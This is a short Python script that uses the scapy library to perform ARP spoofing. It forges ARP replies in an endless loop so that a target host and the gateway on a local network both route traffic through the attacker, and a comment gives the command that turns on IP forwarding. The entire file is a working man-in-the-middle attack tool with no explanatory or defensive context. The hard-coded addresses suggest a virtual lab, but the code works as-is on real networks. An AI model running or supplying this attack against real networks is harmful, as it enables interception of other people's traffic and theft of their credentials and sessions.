import scapy.all as scapy
import time

#echo 1 > /proc/sys/net/ipv4/ip_forward
#let the stream flow


packet = scapy.ARP(op = 2,pdst = "10.0.2.15", hwdst ="08:00:27:e6:e5:59", psrc = "10.0.2.1")
#print(packet.show())
#print(packet.summary())
scapy.send(packet)

def spoof(target_ip, spoof_ip):
    target_mac = get_mac_address(target_ip)
    #spoof target ip at target mac address with spoof ip
    packet = scapy.ARP(op = 2,pdst = target_ip, hwdst =target_mac, psrc = spoof_ip)
    scapy.send(packet)

def get_mac_address(ip):
    arp_request = scapy.ARP(pdst = ip)
    #arp_request.show()
    broad_cast = scapy.Ether(dst = 'ff:ff:ff:ff:ff:ff')
    #broad_cast.show()
    arp_request_broad_cast = broad_cast/arp_request
    #arp_request_broad_cast.show()
    answer_list = scapy.srp(arp_request_broad_cast, timeout = 1,verbose =False)[0]
    
    return answer_list[0][1].hwsrc

while True:
    spoof('10.0.2.15','10.0.2.1')
    spoof('10.0.2.1','10.0.2.15')
    time.sleep(2)


